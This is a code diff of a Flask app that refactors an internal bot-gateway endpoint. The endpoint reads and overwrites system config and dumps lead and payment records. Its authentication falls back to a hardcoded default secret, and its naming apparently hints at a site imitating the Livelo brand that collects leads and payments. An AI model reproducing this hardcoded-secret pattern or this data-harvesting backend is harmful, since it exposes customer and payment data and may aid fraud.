@@ -1232,67 +1232,37 @@ def api_log_action():
     return jsonify({"ok": True})
 
 
-@app.route("/api/internal/bot-gateway", methods=["POST"])
-def api_bot_gateway():
-    secret = os.environ.get("BOT_SECRET", "livelo_bot_secret_2026")
-    if request.headers.get("X-Bot-Secret", "") != secret:
-        return jsonify({"ok": False, "error": "Unauthorized"}), 401
-    data = request.get_json(silent=True) or {}
-    action = data.get("action")
-    payload = data.get("payload", {})
+def process_bot_action(action, payload=None):
+    payload = payload or {}
     db = get_db()
     
     if action == "get_config":
         rows = db.execute("SELECT key, value FROM sys_config").fetchall()
-        return jsonify({"ok": True, "config": {r["key"]: r["value"] for r in rows}})
+        return {"ok": True, "config": {r["key"]: r["value"] for r in rows}}
         
     elif action == "set_config":
         for k, v in payload.items():
             db.execute("INSERT OR REPLACE INTO sys_config (key, value) VALUES (?, ?)", (k, v))
         db.commit()
-        return jsonify({"ok": True})
+        return {"ok": True}
         
     elif action == "get_leads":
         limit = payload.get("limit", 10)
         rows = db.execute("SELECT * FROM leads ORDER BY created_at DESC LIMIT ?", (limit,)).fetchall()
-        return jsonify({"ok": True, "leads": [dict(r) for r in rows]})
+        return {"ok": True, "leads": [dict(r) for r in rows]}
         
-
-
     elif action == "get_payments":
         limit = payload.get("limit", 10)
         rows = db.execute("SELECT * FROM payments ORDER BY created_at DESC LIMIT ?", (limit,)).fetchall()
-        return jsonify({"ok": True, "payments": [dict(r) for r in rows]})
+        return {"ok": True, "payments": [dict(r) for r in rows]}
         
     elif action == "get_financeiro":
         total_leads = db.execute("SELECT COUNT(*) FROM leads").fetchone()[0]
-        pagos = db.execute("SELECT SUM(amount), COUNT(*) FROM payments WHERE status='approved' OR status='pago'").fetchone()
-        pendentes = db.execute("SELECT COUNT(*) FROM payments WHERE status='pending'").fetchone()[0]
-        
-        stats = {
-            "qtd_leads": total_leads,
-            "total_pago": f"{pagos[0] or 0:.2f}",
-            "qtd_pago": pagos[1] or 0,
-            "qtd_pendente": pendentes
-        }
-        return jsonify({"ok": True, "stats": stats})
-
-        
-
-
-    elif action == "get_financeiro":
-        total_leads = db.execute("SELECT COUNT(*) FROM leads").fetchone()[0]
-        # Cartoes feitos is leads where card_style is not null
         cartoes_feitos = db.execute("SELECT COUNT(*) FROM leads WHERE card_style IS NOT NULL AND card_style != ''").fetchone()[0]
-        
         pagamentos_gerados = db.execute("SELECT COUNT(*) FROM payments").fetchone()[0]
-        
         pagos = db.execute("SELECT SUM(amount), COUNT(*) FROM payments WHERE status='approved' OR status='pago'").fetchone()
         pendentes = db.execute("SELECT COUNT(*) FROM payments WHERE status='pending'").fetchone()[0]
         cancelados = db.execute("SELECT COUNT(*) FROM payments WHERE status='rejected' OR status='cancelled'").fetchone()[0]
-        
-        # Entradas could be total accesses (maybe we log it in a table? Or just total leads)
-        # Let's count total leads as 'entradas' and 'saidas' as bounce rate or just empty
         
         stats = {
             "qtd_leads": total_leads,
@@ -1304,14 +1274,19 @@ def api_bot_gateway():
             "qtd_cancelado": cancelados,
             "host_status": "🟢 Vercel Serverless (Online)",
             "api_status": "🟢 Ativa & Sincronizada",
-            "security_status": "🟢 Blindagem Ant-Scrape Ativa (Apenas BR)"
+            "security_status": "🟢 Blindagem Ant-Scrape Ativa"
         }
-        return jsonify({"ok": True, "stats": stats})
-
-
-
+        return {"ok": True, "stats": stats}
         
-    return jsonify({"ok": False, "error": "Unknown action"}), 400
+    return {"ok": False, "error": "Unknown action"}
+
+@app.route("/api/internal/bot-gateway", methods=["POST"])
+def api_bot_gateway():
+    secret = os.environ.get("BOT_SECRET", "livelo_bot_secret_2026")
+    if request.headers.get("X-Bot-Secret", "") != secret:
+        return jsonify({"ok": False, "error": "Unauthorized"}), 401
+    data = request.get_json(silent=True) or {}
+    return jsonify(process_bot_action(data.get("action"), data.get("payload")))
 
 
 @app.route("/api/admin/advanced-config", methods=["POST"])
